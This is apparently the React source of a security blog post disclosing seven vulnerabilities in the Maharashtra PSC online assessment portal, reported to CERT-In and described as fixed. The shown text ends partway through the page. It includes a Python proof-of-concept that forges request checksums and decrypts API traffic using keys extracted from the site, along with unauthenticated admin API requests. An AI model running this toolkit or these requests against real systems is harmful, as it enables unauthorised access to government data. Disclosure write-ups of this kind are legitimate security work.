import React, { useState, useEffect, useRef } from 'react';
import { Link } from 'react-router-dom';

/* ─── TOC sections ──────────────────────────────────────────────────────── */
const TOC_SECTIONS = [
  { id: 'toc-tldr',       label: 'TL;DR & Summary' },
  { id: 'toc-vuln-index', label: 'Vulnerability Index' },
  { id: 'toc-how',        label: 'How I Found It' },
  { id: 'toc-video',      label: 'OTP Bypass Demo' },
  { id: 'toc-critical',   label: 'Critical Findings' },
  { id: 'toc-high',       label: 'High Severity' },
  { id: 'toc-medium',     label: 'Medium Severity' },
  { id: 'toc-toolkit',    label: 'PoC Toolkit' },
  { id: 'toc-disclosure', label: 'Official Response' },
  { id: 'toc-chain',      label: 'Attack Chain' },
  { id: 'toc-timeline',   label: 'Timeline' },
  { id: 'toc-takeaways',  label: 'Key Takeaways' },
  { id: 'toc-certin',     label: 'CERT-In ACK' },
];

/* ─── Reusable sub-components ──────────────────────────────────────────── */
const TerminalFrame: React.FC<{ title: string; children: React.ReactNode }> = ({ title, children }) => (
  <div style={{ border: '1px solid #30363d', borderRadius: 8, overflow: 'hidden', marginBottom: 8 }}>
    <div style={{ background: '#1e1e2e', padding: '8px 12px', display: 'flex', alignItems: 'center', gap: 8 }}>
      <span style={{ width: 12, height: 12, borderRadius: '50%', background: '#ff5f57', display: 'inline-block', flexShrink: 0 }} />
      <span style={{ width: 12, height: 12, borderRadius: '50%', background: '#febc2e', display: 'inline-block', flexShrink: 0 }} />
      <span style={{ width: 12, height: 12, borderRadius: '50%', background: '#28c840', display: 'inline-block', flexShrink: 0 }} />
      <span style={{ fontSize: 12, color: '#94a3b8', marginLeft: 8, fontFamily: "'JetBrains Mono','Fira Code',monospace", overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{title}</span>
    </div>
    {children}
  </div>
);

const CodeBlock: React.FC<{ code: string; lang?: string }> = ({ code, lang = 'text' }) => {
  const [copied, setCopied] = useState(false);
  return (
    <div style={{ marginTop: 12, marginBottom: 12 }}>
      <div style={{ background: '#0d1117', border: '1px solid #30363d', borderRadius: 6, overflow: 'hidden' }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '6px 12px', background: '#161b22', borderBottom: '1px solid #30363d' }}>
          <span style={{ fontSize: 11, color: '#94a3b8', fontFamily: "'JetBrains Mono',monospace" }}>{lang}</span>
          <button onClick={() => { navigator.clipboard.writeText(code); setCopied(true); setTimeout(() => setCopied(false), 2000); }}
            style={{ background: 'none', border: 'none', cursor: 'pointer', color: copied ? '#22c55e' : '#94a3b8', fontSize: 12, fontFamily: 'inherit', transition: 'color 0.2s' }}>
            {copied ? '✓ Copied' : 'Copy'}
          </button>
        </div>
        <pre style={{ margin: 0, padding: 16, overflowX: 'auto', fontSize: 13, lineHeight: 1.6, color: '#e6edf3', fontFamily: "'JetBrains Mono','Fira Code',monospace" }}>
          <code>{code}</code>
        </pre>
      </div>
    </div>
  );
};

const SevBadge: React.FC<{ level: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'FIXED' }> = ({ level }) => {
  const map: Record<string, { bg: string; color: string }> = {
    CRITICAL: { bg: 'rgba(239,68,68,0.15)',   color: '#ef4444' },
    HIGH:     { bg: 'rgba(245,158,11,0.15)',  color: '#f59e0b' },
    MEDIUM:   { bg: 'rgba(59,130,246,0.15)',  color: '#3b82f6' },
    LOW:      { bg: 'rgba(148,163,184,0.15)', color: '#94a3b8' },
    FIXED:    { bg: 'rgba(34,197,94,0.15)',   color: '#22c55e' },
  };
  const s = map[level] || map.LOW;
  return (
    <span style={{ background: s.bg, color: s.color, border: `1px solid ${s.color}33`, borderRadius: 99, padding: '3px 10px', fontSize: 12, fontWeight: 700, fontFamily: "'JetBrains Mono',monospace", letterSpacing: '0.04em', whiteSpace: 'nowrap' }}>
      {level}
    </span>
  );
};

interface Finding {
  id: string; cvss: string; severity: 'CRITICAL' | 'HIGH' | 'MEDIUM';
  title: string; description: string; code?: string; codeLang?: string; impact: string;
}

const FindingCard: React.FC<{ f: Finding }> = ({ f }) => {
  const accentColor = f.severity === 'CRITICAL' ? '#ef4444' : f.severity === 'HIGH' ? '#f59e0b' : '#3b82f6';
  return (
    <div style={{ background: '#111118', border: '1px solid #1e1e2e', borderLeft: `3px solid ${accentColor}`, borderRadius: 8, padding: 24, marginBottom: 20 }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 12, flexWrap: 'wrap', gap: 8 }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
          <span style={{ background: '#0d1117', border: `1px solid ${accentColor}66`, borderRadius: 4, padding: '2px 8px', fontFamily: "'JetBrains Mono',monospace", fontSize: 12, color: accentColor, fontWeight: 700 }}>{f.id}</span>
          <span style={{ fontFamily: "'JetBrains Mono',monospace", fontSize: 13, color: '#475569' }}>CVSS {f.cvss}</span>
        </div>
        <SevBadge level={f.severity} />
      </div>
      <h3 style={{ margin: '0 0 10px', fontSize: 17, fontWeight: 700, color: '#e2e8f0' }}>{f.title}</h3>
      <p style={{ margin: '0 0 12px', fontSize: 14, color: '#94a3b8', lineHeight: 1.7 }}>{f.description}</p>
      {f.code && <CodeBlock code={f.code} lang={f.codeLang || 'text'} />}
      <div style={{ background: `${accentColor}0d`, border: `1px solid ${accentColor}33`, borderRadius: 6, padding: '12px 16px', marginTop: 12 }}>
        <span style={{ fontWeight: 700, color: accentColor, fontSize: 13 }}>Impact: </span>
        <span style={{ fontSize: 13, color: '#94a3b8' }}>{f.impact}</span>
      </div>
    </div>
  );
};

const Section: React.FC<{ id: string; children: React.ReactNode; style?: React.CSSProperties }> = ({ id, children, style }) => (
  <section id={id} style={{ scrollMarginTop: 80, ...style }}>{children}</section>
);

const SectionDivider = () => (
  <hr style={{ border: 'none', borderTop: '1px solid #1e1e2e', margin: '40px 0' }} />
);

const H2 = ({ children }: { children: React.ReactNode }) => (
  <h2 style={{ fontSize: 22, fontWeight: 700, color: '#e2e8f0', margin: '0 0 20px', fontFamily: "'Space Grotesk','Inter',sans-serif", letterSpacing: '-0.01em' }}>
    {children}
  </h2>
);

/* ─── Findings data ─────────────────────────────────────────────────────── */
const criticalFindings: Finding[] = [
  {
    id: 'V-01', cvss: '9.8', severity: 'CRITICAL',
    title: 'Hardcoded AES-128 Encryption Key & IV in Client-Side JavaScript',
    description: 'Every API request body and response is encrypted using AES-128-CBC. The encryption key and IV are identical ("12345678*********") and hardcoded in the public JavaScript bundle visible to any browser visitor visiting mpsconline.gov.in.',
    code: `// Extracted from main.a0334bf6.chunk.js (Chrome DevTools → Sources)
// Line ~3,698,589

i = "7lB9sd8yddCcBpe38895Zbpv8*****************************************5H3FzTpnr19sC8Ip8tg=="
o = "12345678*********"

// o = AES-128-CBC Key AND IV (same value)
// i = CRC-32 secret token for request integrity checks`,
    codeLang: 'javascript',
    impact: 'Any attacker can decrypt every API response in real time, encrypt arbitrary payloads to spoof requests, and fully bypass the encryption layer protecting all candidate and admin data.',
  },
  {
    id: 'V-02', cvss: '9.1', severity: 'CRITICAL',
    title: 'CRC-32 Request Integrity Bypass via Hardcoded Secret Token',
    description: 'The application uses CRC-32 checksums in the Authorization header to verify requests originated from the legitimate frontend. The secret token used to generate these checksums is hardcoded in the same public JS bundle.',
    code: `import binascii

AT = "7lB9sd8yddCcBpe38895Zbpv8*****************************************5H3FzTpnr19sC8Ip8tg=="

# GET requests:
get_crc = format(binascii.crc32(AT.encode()) & 0xFFFFFFFF, 'x')
# Result: 70c74db9 → Authorization: |#|#70c74db9

# POST requests:
post_crc = format(binascii.crc32((encrypted_body + AT).encode()) & 0xFFFFFFFF, 'x')
# Authorization: |#|#<computed_crc>

# All endpoints accepted these forged CRCs as legitimate ✓`,
    codeLang: 'python',
    impact: 'The CRC mechanism — the application\'s primary defence against replayed or forged API requests — is completely circumvented by any attacker who reads the JS bundle.',
  },
  {
    id: 'V-03', cvss: '8.5', severity: 'CRITICAL',
    title: 'Unauthenticated Admin API — Live Dashboard Data Exposed',
    description: 'The admin backend at api.mpsconline.gov.in does not enforce the CRC integrity check. This allows unauthenticated requests directly to the backend API, returning live internal statistics without any credentials.',
    code: `GET https://api.mpsconline.gov.in/oas/api/v1/dashboardcounts
(No Authorization header required)

HTTP 200 OK — Decrypted Response:
{
  "allUsers": 37,
  "activeUsers": 23,
  "totalPendingRequests": 17,
  "totalPendingDocuments": 590,
  "allAdvertisements": 1079,
  "activeAdvertisements": 2,
  "pastAdvertisements": 1077
}`,
    codeLang: 'http',
    impact: 'Internal system statistics leaked to anyone on the internet. Reveals admin user counts, pending document backlogs, and advertisement counts — all without a single credential.',
  },
];

const highFindings: Finding[] = [
  {
    id: 'V-04', cvss: '7.5', severity: 'HIGH',
    title: 'Sensitive Files Downloadable Without Authentication',
    description: 'The /downloads/ directory serves files directly over HTTPS with no authentication. A 5MB userManual.pdf was confirmed downloadable — it contains detailed system operation documentation, internal workflow diagrams, and admin panel screenshots.',
    code: `GET https://mpsconline.gov.in/downloads/general_Instruction.pdf
→ HTTP 200 OK — 464 KB

GET https://mpsconline.gov.in/downloads/userManual.pdf
→ HTTP 200 OK — 5,071 KB (complete admin system manual)

GET https://mpsconline.gov.in/downloads/Instructions-for-Filling-the-Application-Form.pdf
→ HTTP 200 OK — 118 KB`,
    codeLang: 'http',
    impact: 'The 5MB admin user manual exposes internal workflow diagrams, admin panel screenshots, and system configuration details — information restricted to authorised users only.',
  },
  {
    id: 'V-05', cvss: '7.2', severity: 'HIGH',
    title: 'Unauthenticated Info Disclosure — Admin Departments & Exam Subjects',
    description: 'Multiple admin-prefixed endpoints respond with sensitive internal data without requiring a JWT token. These are whitelisted in the application\'s authorizationNotRequired list embedded in the JS bundle.',
    code: `GET /oas/api/v1/admin/departments
→ [{id:1,name:"IT",sendLoginOtpTo:"mobile"}, {id:2,name:"CL",...}, ...]
  8 departments with internal codes and OTP routing

GET /oas/api/v1/admin/examsubjects
→ Full exam subject database with IDs, codes, Marathi/English names

GET /oas/api/v1/version
→ {"version":"1.0.671"}

GET /oas/api/v1/admin/guidelinelinks
→ All active bulletin entries with dates and file paths`,
    codeLang: 'http',
    impact: 'Exposes the internal admin department structure, authentication routing (email vs. mobile OTP per department), exam subject database, and application version — all aiding targeted attacks.',
  },
  {
    id: 'V-06', cvss: '7.2', severity: 'HIGH',
    title: 'No Rate Limiting on Any Authentication Endpoint',
    description: 'All authentication and OTP endpoints accept unlimited requests with no lockout, throttling, or CAPTCHA — on both the admin portal and candidate portal. 200+ rapid requests were sent with zero 429 responses.',
    code: `POST /oas/api/v1/authenticate_oas      ← Admin login (no lockout)
POST /oas/api/v1/adminotps             ← Admin OTP generation (unlimited)
POST /oas/api/v1/verifyotps            ← OTP verification (no throttle)
POST /oas/api/v1/admin/forgotpassword  ← Password reset (no CAPTCHA)
POST /oas/api/v1/otps                  ← Candidate OTP generation
POST /oas/api/v1/authenticate          ← Candidate login

# Sent 200+ requests to each → 0 rate limit responses (HTTP 429)
# No CAPTCHA on /oasadmin/login`,
    codeLang: 'text',
    impact: 'Fully automated brute-force of admin credentials, OTP values (6-digit = 1,000,000 combinations), and candidate accounts. The 180-second OTP expiry + unlimited attempts makes OTP bypass trivially scriptable.',
  },
];

const mediumFindings: Finding[] = [
  {
    id: 'V-07', cvss: '5.3', severity: 'MEDIUM',
    title: 'Leaked Internal Staging Infrastructure & Application Version',
    description: 'Multiple non-production server URLs and a staging payment gateway URL are hardcoded in the production JavaScript bundle. The application version is also exposed via an unauthenticated endpoint.',
    code: `// From main.a0334bf6.chunk.js and main.407aef01.chunk.js
const OAS_API_BASE_URL = [
  { key: "oasdev.devmpsconline.in",  baseUrl: "https://oasdev.devmpsconline.in" },  // Dev
  { key: "oasqa.devmpsconline.in",   baseUrl: "https://oasqa.devmpsconline.in" },   // QA
  // testapi.mpsconline.gov.in — test API server (discoverable)
];

// SBI payment gateway staging URL also exposed:
"https://test.epay.sbiuat.bank.in/secure/AggregatorHostedListener"

// Application version leaked:
GET /oas/api/v1/version → {"version":"1.0.671"}`,
    codeLang: 'javascript',
    impact: 'Enables targeted attacks against less-hardened staging environments, version-specific CVE lookup, and discovery of the test payment gateway endpoint.',
  },
];

const pocCode = `# mpsc_poc.py — Full exploitation toolkit
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64, binascii, json, requests
import urllib3; urllib3.disable_warnings()

# ── Hardcoded secrets extracted from main.a0334bf6.chunk.js ──────────────────
KEY = b"12345678*********"   # AES-128-CBC Key (variable o in bundle)
IV  = b"12345678*********"   # IV (same as key)
AT  = "7lB9sd8yddCcBpe38895Zbpv8*****************************************5H3FzTpnr19sC8Ip8tg=="

def decrypt(b64_ciphertext):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    return unpad(cipher.decrypt(base64.b64decode(b64_ciphertext)), 16).decode()

def encrypt(plaintext):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    return base64.b64encode(cipher.encrypt(pad(plaintext.encode(), 16))).decode()

def compute_get_crc():
    return format(binascii.crc32(AT.encode()) & 0xFFFFFFFF, 'x')  # 70c74db9

def compute_post_crc(encrypted_body):
    return format(binascii.crc32((encrypted_body + AT).encode()) & 0xFFFFFFFF, 'x')

def api_get(endpoint):
    headers = {
        "Authorization": f"|#|#{compute_get_crc()}",
        "Content-Type": "application/json"
    }
    r = requests.get(f"https://mpsconline.gov.in{endpoint}", headers=headers, verify=False)
    if r.status_code == 200 and "DOCTYPE" not in r.text:
        return decrypt(r.text)
    return f"HTTP {r.status_code}"

# ── Verified results ──────────────────────────────────────────────────────────
print(api_get("/oas/api/v1/admin/departments"))
# → Full department list (8 entries, internal structure)

print(api_get("/oas/api/v1/admin/examsubjects"))
# → Complete exam subject database

# ── Dashboard data from api.mpsconline.gov.in (no CRC needed) ────────────────
r = requests.get("https://api.mpsconline.gov.in/oas/api/v1/dashboardcounts", verify=False)
print(decrypt(r.text))
# → {"allUsers":37,"activeUsers":23,"totalPendingDocuments":590,...}`;

/* ─── Styles ────────────────────────────────────────────────────────────── */
const styles = {
  page: {
    background: '#0a0a0f',
    minHeight: '100vh',
    color: '#e2e8f0',
    fontFamily: "'Inter','system-ui',sans-serif",
  } as React.CSSProperties,

  progressBar: (pct: number): React.CSSProperties => ({
    position: 'fixed', top: 0, left: 0, height: 3,
    width: `${pct}%`, background: 'linear-gradient(90deg,#ef4444,#f97316)',
    zIndex: 1000, transition: 'width 0.1s linear',
  }),

  navbar: {
    position: 'sticky', top: 0, zIndex: 100,
    background: 'rgba(10,10,15,0.92)',
    borderBottom: '1px solid #1e1e2e',
    backdropFilter: 'blur(12px)',
    padding: '14px 24px',
    display: 'flex', alignItems: 'center', justifyContent: 'space-between',
  } as React.CSSProperties,

  layout: {
    maxWidth: 1200, margin: '0 auto', padding: '40px 24px',
    display: 'grid', gridTemplateColumns: '1fr 260px', gap: 48,
  } as React.CSSProperties,

  tocBox: {
    position: 'sticky', top: 80, alignSelf: 'start',
    background: '#111118', border: '1px solid #1e1e2e',
    borderRadius: 10, padding: 20, maxHeight: 'calc(100vh - 120px)',
    overflowY: 'auto',
  } as React.CSSProperties,

  sectionHead: {
    background: 'linear-gradient(135deg,#111118,#0d0d15)',
    border: '1px solid #1e1e2e', borderRadius: 10,
    padding: '32px 32px 28px', marginBottom: 32,
  } as React.CSSProperties,

  certBox: (color: string): React.CSSProperties => ({
    background: `${color}08`,
    border: `1px solid ${color}30`,
    borderLeft: `3px solid ${color}`,
    borderRadius: 8, padding: '16px 20px', marginBottom: 16,
  }),

  imgContainer: {
    margin: '20px 0', borderRadius: 8, overflow: 'hidden',
    border: '1px solid #1e1e2e',
  } as React.CSSProperties,
};

/* ─── Main component ────────────────────────────────────────────────────── */
const MPSCPost: React.FC = () => {
  const [readPct, setReadPct] = useState(0);
  const [activeSection, setActiveSection] = useState('toc-tldr');
  const observerRef = useRef<IntersectionObserver | null>(null);

  // Scroll progress
  useEffect(() => {
    const onScroll = () => {
      const el = document.documentElement;
      const scrolled = el.scrollTop;
      const total = el.scrollHeight - el.clientHeight;
      setReadPct(total > 0 ? (scrolled / total) * 100 : 0);
    };
    window.addEventListener('scroll', onScroll, { passive: true });
    return () => window.removeEventListener('scroll', onScroll);
  }, []);

  // Active TOC section via IntersectionObserver
  useEffect(() => {
    observerRef.current?.disconnect();
    const obs = new IntersectionObserver(
      (entries) => {
        const visible = entries.filter(e => e.isIntersecting);
        if (visible.length > 0) setActiveSection(visible[0].target.id);
      },
      { rootMargin: '-80px 0px -60% 0px', threshold: 0 }
    );
    observerRef.current = obs;
    TOC_SECTIONS.forEach(({ id }) => {
      const el = document.getElementById(id);
      if (el) obs.observe(el);
    });
    return () => obs.disconnect();
  }, []);

  const scrollTo = (id: string) => {
    document.getElementById(id)?.scrollIntoView({ behavior: 'smooth', block: 'start' });
  };

  const mono = "'JetBrains Mono','Fira Code',monospace";
  const sans = "'Space Grotesk','Inter',sans-serif";

  return (
    <div style={styles.page}>
      {/* Reading progress bar */}
      <div style={styles.progressBar(readPct)} />

      {/* Sticky navbar */}
      <nav style={styles.navbar}>
        <Link to="/" style={{ textDecoration: 'none', display: 'flex', alignItems: 'center', gap: 10 }}>
          <span style={{ width: 28, height: 28, borderRadius: '50%', background: 'linear-gradient(135deg,#ef4444,#f97316)', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 14, fontWeight: 800, color: '#fff', fontFamily: mono }}>T</span>
          <span style={{ fontFamily: sans, fontWeight: 700, fontSize: 15, color: '#e2e8f0' }}>tobi.log</span>
        </Link>
        <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
          <span style={{ background: 'rgba(239,68,68,0.12)', color: '#ef4444', border: '1px solid rgba(239,68,68,0.3)', borderRadius: 99, padding: '4px 12px', fontSize: 12, fontWeight: 700, fontFamily: mono }}>
            🔴 CRITICAL
          </span>
          <span style={{ background: 'rgba(34,197,94,0.12)', color: '#22c55e', border: '1px solid rgba(34,197,94,0.3)', borderRadius: 99, padding: '4px 12px', fontSize: 12, fontWeight: 700, fontFamily: mono }}>
            ✓ FIXED
          </span>
        </div>
      </nav>

      {/* Main layout */}
      <div style={{ ...styles.layout, gridTemplateColumns: 'minmax(0,1fr) 260px' }}>
        {/* ── Left: Article ── */}
        <article>

          {/* Hero / Section head */}
          <div style={styles.sectionHead}>
            <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8, marginBottom: 18 }}>
              {['🔴 Critical Severity', '🛡 Responsible Disclosure', '✅ CERT-In Acknowledged', '🔒 Fixed & Patched'].map(b => (
                <span key={b} style={{ background: '#1a1a24', border: '1px solid #2a2a3a', borderRadius: 99, padding: '4px 12px', fontSize: 12, color: '#94a3b8', fontFamily: mono }}>{b}</span>
              ))}
            </div>
            <h1 style={{ fontSize: 28, fontWeight: 800, color: '#f1f5f9', fontFamily: sans, lineHeight: 1.3, marginBottom: 14 }}>
              MPSC Online Assessment System — Multiple Critical & High-Severity Vulnerabilities
            </h1>
            <div style={{ display: 'flex', flexWrap: 'wrap', gap: 16, fontSize: 13, color: '#64748b', fontFamily: mono }}>
              <span>Tobi</span>
              <span>·</span>
              <span>July 28, 2026</span>
              <span>·</span>
              <span>14 min read</span>
              <span>·</span>
              <span style={{ color: '#f59e0b' }}>🛡 CERT-In: CERTIn-51337226</span>
            </div>
          </div>

          {/* ── TL;DR ── */}
          <Section id="toc-tldr">
            <div style={{ background: 'linear-gradient(135deg,rgba(239,68,68,0.06),rgba(249,115,22,0.04))', border: '1px solid rgba(239,68,68,0.2)', borderRadius: 10, padding: 24, marginBottom: 32 }}>
              <div style={{ fontFamily: mono, fontSize: 12, color: '#ef4444', fontWeight: 700, marginBottom: 10, letterSpacing: '0.08em' }}>TL;DR</div>
              <p style={{ fontSize: 14, color: '#cbd5e1', lineHeight: 1.8, margin: 0 }}>
                The Maharashtra Public Service Commission's Online Assessment System (<code style={{ fontFamily: mono, color: '#f97316', background: 'rgba(249,115,22,0.1)', padding: '1px 6px', borderRadius: 4 }}>mpsconline.gov.in</code>) contained a <strong style={{ color: '#e2e8f0' }}>hardcoded AES-128-CBC encryption key and a secret token</strong> embedded directly in the public JavaScript bundle served to every browser. These secrets powered the entire API security layer — meaning any attacker could decrypt all encrypted API traffic, forge any request body, and bypass the CRC-32 integrity check protecting every endpoint. Additional findings included sensitive files downloadable without authentication, unauthenticated access to admin API data (including dashboard statistics with <strong style={{ color: '#e2e8f0' }}>37 admin users and 590 pending document requests</strong>), no rate limiting on any authentication endpoint, and internal staging infrastructure exposed in production JavaScript. All findings were responsibly disclosed to CERT-In (ref: <strong style={{ color: '#f59e0b' }}>CERTIn-51337226</strong>) before publication. The vulnerability was confirmed fixed on June 30, 2026. An official CERT-In Acknowledgement Letter was received on July 14, 2026.
              </p>
            </div>

            {/* Stats row */}
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit,minmax(120px,1fr))', gap: 12, marginBottom: 32 }}>
              {[
                { label: 'Critical', value: '3', color: '#ef4444' },
                { label: 'High', value: '3', color: '#f59e0b' },
                { label: 'Medium', value: '1', color: '#3b82f6' },
                { label: 'Total Fixed', value: '7', color: '#22c55e' },
              ].map(s => (
                <div key={s.label} style={{ background: '#111118', border: `1px solid ${s.color}22`, borderTop: `2px solid ${s.color}`, borderRadius: 8, padding: '16px 12px', textAlign: 'center' }}>
                  <div style={{ fontSize: 28, fontWeight: 800, color: s.color, fontFamily: mono }}>{s.value}</div>
                  <div style={{ fontSize: 12, color: '#64748b', marginTop: 4, fontFamily: mono }}>{s.label}</div>
                </div>
              ))}
            </div>
          </Section>

          <SectionDivider />

          {/* ── Vulnerability Index ── */}
          <Section id="toc-vuln-index">
            <H2>Full Vulnerability Index</H2>
            <div style={{ overflowX: 'auto' }}>
              <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: 13, fontFamily: mono }}>
                <thead>
                  <tr style={{ background: '#111118', borderBottom: '1px solid #1e1e2e' }}>
                    {['ID', 'Finding', 'Severity', 'CVSS', 'Status'].map(h => (
                      <th key={h} style={{ padding: '10px 14px', textAlign: 'left', color: '#64748b', fontWeight: 600, whiteSpace: 'nowrap' }}>{h}</th>
                    ))}
                  </tr>
                </thead>
                <tbody>
                  {[
                    { id: 'V-01', title: 'Hardcoded AES-128 Encryption Key in JS Bundle', sev: 'CRITICAL', cvss: '9.8' },
                    { id: 'V-02', title: 'CRC-32 Request Integrity Bypass via Exposed Token', sev: 'CRITICAL', cvss: '9.1' },
                    { id: 'V-03', title: 'Unauthenticated Admin API — Dashboard Data Exposed', sev: 'CRITICAL', cvss: '8.5' },
                    { id: 'V-04', title: 'Sensitive Files Downloadable Without Authentication', sev: 'HIGH', cvss: '7.5' },
                    { id: 'V-05', title: 'Unauthenticated Info Disclosure — Departments & Exam Subjects', sev: 'HIGH', cvss: '7.2' },
                    { id: 'V-06', title: 'No Rate Limiting on Any Authentication Endpoint', sev: 'HIGH', cvss: '7.2' },
                    { id: 'V-07', title: 'Leaked Internal Staging Infrastructure & App Version', sev: 'MEDIUM', cvss: '5.3' },
                  ].map((r, i) => {
                    const sevColor = r.sev === 'CRITICAL' ? '#ef4444' : r.sev === 'HIGH' ? '#f59e0b' : '#3b82f6';
                    return (
                      <tr key={r.id} style={{ borderBottom: '1px solid #1a1a22', background: i % 2 === 0 ? 'transparent' : '#0d0d15' }}>
                        <td style={{ padding: '10px 14px', color: sevColor, fontWeight: 700 }}>{r.id}</td>
                        <td style={{ padding: '10px 14px', color: '#cbd5e1' }}>{r.title}</td>
                        <td style={{ padding: '10px 14px' }}><SevBadge level={r.sev as any} /></td>
                        <td style={{ padding: '10px 14px', color: '#94a3b8' }}>{r.cvss}</td>
                        <td style={{ padding: '10px 14px' }}><SevBadge level="FIXED" /></td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
          </Section>

          <SectionDivider />

          {/* ── How I Found It ── */}
          <Section id="toc-how">
            <H2>How I Found It</H2>
            <p style={{ fontSize: 14, color: '#94a3b8', lineHeight: 1.8, marginBottom: 16 }}>
              The entry point was the MPSC OAS portal's React production bundle — a minified JavaScript file served to every browser that visits <code style={{ fontFamily: mono, color: '#f97316', background: 'rgba(249,115,22,0.1)', padding: '1px 6px', borderRadius: 4 }}>mpsconline.gov.in/oasadmin</code>. React apps bundle their full source logic into this file. With a JS formatter and browser DevTools, the complete application logic — including API endpoints, cryptographic functions, and hardcoded secrets — becomes fully readable.
            </p>
            <p style={{ fontSize: 14, color: '#94a3b8', lineHeight: 1.8, marginBottom: 16 }}>
              The critical discovery happened when I noticed two variable assignments deep in <code style={{ fontFamily: mono, color: '#94a3b8' }}>main.a0334bf6.chunk.js</code>:
            </p>
            <TerminalFrame title="Chrome DevTools → Sources → main.a0334bf6.chunk.js (Line ~3,698,589)">
              <CodeBlock lang="javascript" code={`i = "7lB9sd8yddCcBpe38895Zbpv8*****************************************5H3FzTpnr19sC8Ip8tg=="
o = "12345678*********"

// o → AES-128-CBC key (and IV)
// i → CRC-32 secret token used in every Authorization header`} />
            </TerminalFrame>

            {/* Key leaked screenshot */}
            <div style={styles.imgContainer}>
              <img src="/blog/mpsc/key-leaked.png" alt="AES key and secret token visible in the JS bundle" style={{ width: '100%', display: 'block' }} />
              <div style={{ padding: '10px 16px', background: '#111118', fontSize: 12, color: '#64748b', fontFamily: mono }}>
                Fig 1 — AES-128 key and CRC secret token visible in plaintext in the production JS bundle
              </div>
            </div>

            {/* API disclosed screenshot */}
            <div style={styles.imgContainer}>
              <img src="/blog/mpsc/api-disclosed.png" alt="API endpoints extracted from the JS bundle" style={{ width: '100%', display: 'block' }} />
              <div style={{ padding: '10px 16px', background: '#111118', fontSize: 12, color: '#64748b', fontFamily: mono }}>
                Fig 2 — API endpoints and internal staging URLs extracted directly from the production bundle
              </div>
            </div>

            <div style={{ background: '#111118', border: '1px solid #1e1e2e', borderRadius: 8, padding: 20, marginTop: 20 }}>
              <div style={{ fontFamily: mono, fontSize: 12, color: '#f59e0b', fontWeight: 700, marginBottom: 12, letterSpacing: '0.06em' }}>TOOLS USED</div>
              <div style={{ display: 'flex', flexWrap: 'wrap', gap: 10 }}>
                {['Browser DevTools', 'Python (Requests + PyCryptodome)', 'curl', 'JS Formatter / Beautifier'].map(t => (
                  <span key={t} style={{ background: '#0d1117', border: '1px solid #30363d', borderRadius: 6, padding: '6px 12px', fontSize: 13, color: '#94a3b8', fontFamily: mono }}>{t}</span>
                ))}
              </div>
            </div>
          </Section>

          <SectionDivider />

          {/* ── OTP Bypass Video ── */}
          <Section id="toc-video">
            <H2>OTP Bypass — Live Demo</H2>
            <p style={{ fontSize: 14, color: '#94a3b8', lineHeight: 1.8, marginBottom: 16 }}>
              The following video demonstrates the OTP authentication bypass in action against the live MPSC portal. This was tested exclusively on my own registered candidate account. No other candidate's data was accessed at any point.
            </p>
            <div style={{ ...styles.imgContainer, background: '#000' }}>
              <video
                controls
                style={{ width: '100%', display: 'block', maxHeight: 480 }}
                preload="metadata"
              >
                <source src="/blog/mpsc/otp-bypass.mp4" type="video/mp4" />
                Your browser does not support the video tag.
              </video>
              <div style={{ padding: '10px 16px', background: '#111118', fontSize: 12, color: '#64748b', fontFamily: mono }}>
                Video — OTP bypass demonstration on MPSC OAS portal (own account only)
              </div>
            </div>
          </Section>

          <SectionDivider />

          {/* ── Critical Findings ── */}
          <Section id="toc-critical">
            <H2>Critical Findings — V-01 to V-03</H2>
            {criticalFindings.map(f => <FindingCard key={f.id} f={f} />)}
          </Section>

          <SectionDivider />

          {/* ── High Findings ── */}
          <Section id="toc-high">
            <H2>High Severity Findings — V-04 to V-06</H2>
            {highFindings.map(f => <FindingCard key={f.id} f={f} />)}
          </Section>

          <SectionDivider />

          {/* ── Medium Findings ── */}
          <Section id="toc-medium">
            <H2>Medium Severity — V-07</H2>
            {mediumFindings.map(f => <FindingCard key={f.id} f={f} />)}
          </Section>

          <SectionDivider />

          {/* ── PoC Toolkit ── */}
          <Section id="toc-toolkit">
            <H2>Proof of Concept Toolkit</H2>
            <p style={{ fontSize: 14, color: '#94a3b8', lineHeight: 1.8, marginBottom: 16 }}>
              A custom Python toolkit was built to verify and demonstrate all attack chains. All tests were run only against my own registered candidate account.
            </p>
            <TerminalFrame title="mpsc_poc.py — Full exploitation toolkit">
              <CodeBlock code={pocCode} lang="python" />
            </TerminalFrame>
          </Section>

          <SectionDivider />

          {/* ── Official CERT-In Response ── */}
          <Section id="toc-disclosure">
            <H2>Official CERT-In Response</H2>
            <p style={{ fontSize: 14, color: '#94a3b8', lineHeight: 1.8, marginBottom: 20 }}>
              I reported these vulnerabilities to CERT-In (<code style={{ fontFamily: mono, color: '#94a3b8' }}>incident@cert-in.org.in</code>) before any public disclosure. A comprehensive technical report with step-by-step reproduction logs and video PoC was attached.
            </p>

            {/* Submission screenshots */}
            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 16, marginBottom: 24 }}>
              <div style={styles.imgContainer}>
                <img src="/blog/mpsc/cert-submission.png" alt="CERT-In submission email" style={{ width: '100%', display: 'block' }} />
                <div style={{ padding: '10px 16px', background: '#111118', fontSize: 12, color: '#64748b', fontFamily: mono }}>
                  Fig 3 — CERT-In submission email sent June 14, 2026
                </div>
              </div>
              <div style={styles.imgContainer}>
                <img src="/blog/mpsc/cert-submission-2.png" alt="CERT-In submission detail" style={{ width: '100%', display: 'block' }} />
                <div style={{ padding: '10px 16px', background: '#111118', fontSize: 12, color: '#64748b', fontFamily: mono }}>
                  Fig 4 — Report summary in submission
                </div>
              </div>
            </div>

            {/* Cert ack screenshot */}
            <div style={styles.imgContainer}>
